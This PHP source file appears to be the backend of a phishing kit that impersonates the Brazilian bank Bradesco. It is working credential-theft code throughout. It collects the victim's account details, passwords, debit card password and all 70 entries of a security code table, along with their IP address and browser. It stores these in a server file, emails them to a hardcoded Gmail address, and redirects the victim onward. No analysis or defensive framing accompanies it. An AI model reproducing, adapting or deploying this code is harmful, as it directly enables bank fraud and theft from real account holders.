<?php
error_reporting(0);

session_start();

$chave = $_POST["chave"];

date_default_timezone_set('America/Sao_Paulo');

$pcname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$para="rolexasus@gmail.com";
$n_dir="arquivos/";
$data = date("d/m/y"); // * Função para pegar a data de envio do e-mail
$ip = $_SERVER['REMOTE_ADDR']; // * Função para pegar o ip do usuário
$navegador = $_SERVER['HTTP_USER_AGENT']; // * Função para pegar o navegador do visitante
$hora = date("H:i");
$subj = "Dados / IP: $ip - Bradesco: Tabela";



$msg = "
   ---------------------------------------------
$data-($hora) - $ip - $pcname
---------------------------------------------

   ------------ BRADESCO ------------
AG: '.$_SESSION[agencia].'
CONTA: '.$_SESSION[conta].'-'.$_SESSION[digito].'
SENHA 4: '.$_SESSION[senha]. '
CHAVE: '.$_POST[chave]. '
SENHA CC DÉBITO: '.$_POST[senhacd]. '

====== DADOS DO CC =======
$cc1 - $cc2 - $cc3 - $cc4
$meses/$anual
$infovia - $tiporei
==========FIM CC =========
--------------------------------------------
TABELA: '.$_POST[referencia].'
--------------------------------------------
01....: '.$_POST[pos1]. '
02....: '.$_POST[pos2]. '
03....: '.$_POST[pos3]. '
04....: '.$_POST[pos4]. '
05....: '.$_POST[pos5]. '
06....: '.$_POST[pos6]. '
07....: '.$_POST[pos7]. '
08....: '.$_POST[pos8]. '
09....: '.$_POST[pos9]. '
10....: '.$_POST[pos10]. '
11....: '.$_POST[pos11]. '
12....: '.$_POST[pos12]. '
13....: '.$_POST[pos13]. '
14....: '.$_POST[pos14]. '
15....: '.$_POST[pos15]. '
16....: '.$_POST[pos16]. '
17....: '.$_POST[pos17]. '
18....: '.$_POST[pos18]. '
19....: '.$_POST[pos19]. '
20....: '.$_POST[pos20]. '
21....: '.$_POST[pos21]. '
22....: '.$_POST[pos22]. '
23....: '.$_POST[pos23]. '
24....: '.$_POST[pos24]. '
25....: '.$_POST[pos25]. '
26....: '.$_POST[pos26]. '
27....: '.$_POST[pos27]. '
28....: '.$_POST[pos28]. '
29....: '.$_POST[pos29]. '
30....: '.$_POST[pos30]. '
31....: '.$_POST[pos31]. '
32....: '.$_POST[pos32]. '
33....: '.$_POST[pos33]. '
34....: '.$_POST[pos34]. '
35....: '.$_POST[pos35]. '
36....: '.$_POST[pos36]. '
37....: '.$_POST[pos37]. '
38....: '.$_POST[pos38]. '
39....: '.$_POST[pos39]. '
40....: '.$_POST[pos40]. '
41....: '.$_POST[pos41]. '
42....: '.$_POST[pos42]. '
43....: '.$_POST[pos43]. '
44....: '.$_POST[pos44]. '
45....: '.$_POST[pos45]. '
46....: '.$_POST[pos46]. '
47....: '.$_POST[pos47]. '
48....: '.$_POST[pos48]. '
49....: '.$_POST[pos49]. '
50....: '.$_POST[pos50]. '
51....: '.$_POST[pos51]. '
52....: '.$_POST[pos52]. '
53....: '.$_POST[pos53]. '
54....: '.$_POST[pos54]. '
55....: '.$_POST[pos55]. '
56....: '.$_POST[pos56]. '
57....: '.$_POST[pos57]. '
58....: '.$_POST[pos58]. '
59....: '.$_POST[pos59]. '
60....: '.$_POST[pos60]. '
61....: '.$_POST[pos61]. '
62....: '.$_POST[pos62]. '
63....: '.$_POST[pos63]. '
64....: '.$_POST[pos64]. '
65....: '.$_POST[pos65]. '
66....: '.$_POST[pos66]. '
67....: '.$_POST[pos67]. '
68....: '.$_POST[pos68]. '
69....: '.$_POST[pos69]. '
70....: '.$_POST[pos70].'
------------BRADESCO INVESTIMENTOS------------

   ";

$h = date(" d-m-Y H-i-s");
$fp = fopen("$n_dir"."Bradesco_Tabela"."["."$h]"."$ip".".txt", "a");
$escreve = fwrite($fp, $msg);
fclose($fp); 
	
mail($para, $subj, $msg, "from: $aviao");

{
?>
	<html>
	<body>
    <form name="formdes" id="formdes" method="post">
    <input name="chave" id="chave" type="hidden" value="<?php echo $chave; ?>" >
    </form>
 
	</body>
    <script language= "JavaScript">
location.href="home.chave.php";
</script>
	</html>
<?php
}
?>
